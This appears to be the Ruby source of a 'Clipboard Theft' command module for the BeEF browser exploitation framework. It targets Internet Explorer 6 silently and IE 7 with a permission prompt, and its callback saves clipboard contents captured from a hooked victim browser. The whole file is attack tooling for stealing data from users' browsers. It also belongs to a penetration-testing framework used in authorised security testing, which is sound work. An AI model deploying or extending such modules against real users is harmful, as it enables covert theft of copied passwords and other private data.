class Clipboard_theft < BeEF::Core::Command
  
  def initialize
    super({
      'Name' => 'Clipboard Theft',
      'Description' => 'Retrieves the clipboard contents. This module will work automatically with Internet Explorer 6.x however Internet Explorer 7.x will prompt the user and ask for permission to access the clipboard.',
      'Category' => 'Misc',
      'Author' => 'bcoles',
      'File' => __FILE__
    })
    
    set_target({
      'verified_status' => VERIFIED_WORKING,
      'browser_name' => IE,
      'browser_max_ver' => "6",
      'browser_min_ver' => "6"
    })
    set_target({
      'verified_status' => VERIFIED_USER_NOTIFY,
      'browser_name' => IE,
      'browser_max_ver' => "7",
      'browser_min_ver' => "7"
    })
    set_target({
      'verified_status' => VERIFIED_NOT_WORKING,
      'browser_name' => ALL
    })

    use_template!
  end
  
  def callback
    content = {}
    content['clipboard'] = @datastore['clipboard']
    save content
  end
  
end
